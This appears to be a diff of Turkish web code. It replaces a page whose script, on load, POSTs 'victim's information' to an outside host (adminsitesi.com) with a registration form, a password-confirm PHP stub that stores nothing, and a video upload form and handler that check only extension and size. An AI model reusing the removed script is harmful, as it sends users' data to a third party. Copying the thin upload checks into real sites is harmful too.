@@ -1,32 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Alma Sitesi</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var bilgiler = {
-                "bilgi": "KURBANIN_BILGILERI"
-            };
-            fetch("https://adminsitesi.com/bilgi_gonder", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(bilgiler)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Bilgiler başarıyla gönderildi!");
-                } else {
-                    console.error("Bir hata oluştu:", response.status);
-                }
-            })
-            .catch(error => {
-                console.error("Bir hata oluştu:", error);
-            });
-        });
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kayıt Ol</title>
 </head>
 <body>
+    <h2>Kayıt Ol</h2>
+    <form action="register_process.php" method="post">
+        <input type="text" name="username" placeholder="Kullanıcı Adı" required><br>
+        <input type="password" name="password" placeholder="Şifre" required><br>
+        <input type="password" name="confirm_password" placeholder="Şifreyi Tekrar Gir" required><br>
+        <button type="submit">Kayıt Ol</button>
+    </form>
 </body>
 </html>
+
+<?php
+// Kullanıcı adı ve şifreleri alınır
+$username = $_POST['username'];
+$password = $_POST['password'];
+$confirm_password = $_POST['confirm_password'];
+
+// Şifrelerin eşleştiğini kontrol edin
+if ($password !== $confirm_password) {
+    echo "Hata: Şifreler eşleşmiyor.";
+    exit();
+}
+
+// Kullanıcıyı veritabanına kaydedin (bu adımı veritabanı bağlantısı ve ekleme işlemiyle tamamlayın)
+// Veritabanına kullanıcıyı kaydetmek için gerekli SQL sorgusunu yazın
+
+// Kayıt başarılı mesajı gösterin
+echo "Kayıt başarıyla tamamlandı. Şimdi giriş yapabilirsiniz.";
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ana Sayfa</title>
+</head>
+<body>
+    <h2>Diğer Kullanıcıların Videoları</h2>
+    <!-- Burada diğer kullanıcıların yüklediği videoları gösterin -->
+
+    <a href="upload.php">Video Yükle</a>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Yükle</title>
+</head>
+<body>
+    <h2>Video Yükle</h2>
+    <form action="upload_process.php" method="post" enctype="multipart/form-data">
+        <input type="file" name="videoFile" accept="video/*">
+        <button type="submit" name="submit">Videoyu Yükle</button>
+    </form>
+</body>
+</html>
+
+<?php
+if(isset($_POST["submit"])) {
+    $targetDir = "uploads/";
+    $targetFile = $targetDir . basename($_FILES["videoFile"]["name"]);
+    $uploadOk = 1;
+    $videoFileType = strtolower(pathinfo($targetFile,PATHINFO_EXTENSION));
+    
+    // Check if file already exists
+    if (file_exists($targetFile)) {
+        echo "Bu video zaten var.";
+        $uploadOk = 0;
+    }
+
+    // Check file size (max 100MB)
+    if ($_FILES["videoFile"]["size"] > 100000000) {
+        echo "Üzgünüz, dosya çok büyük.";
+        $uploadOk = 0;
+    }
+
+    // Allow only certain video formats
+    if($videoFileType != "mp4" && $videoFileType != "avi" && $videoFileType != "mov"
+    && $videoFileType != "mpeg" && $videoFileType != "mkv") {
+        echo "Üzgünüz, sadece MP4, AVI, MOV, MPEG veya MKV dosyaları yüklenebilir.";
+        $uploadOk = 0;
+    }
+
+    // Check if $uploadOk is set to 0 by an error
+    if ($uploadOk == 0) {
+        echo "Üzgünüz, video yüklenemedi.";
+    // if everything is ok, try to upload file
+    } else {
+        if (move_uploaded_file($_FILES["videoFile"]["tmp_name"], $targetFile)) {
+            echo "Video başarıyla yüklendi.";
+        } else {
+            echo "Üzgünüz, bir hata oluştu ve video yüklenemedi.";
+        }
+    }
+}
+?>
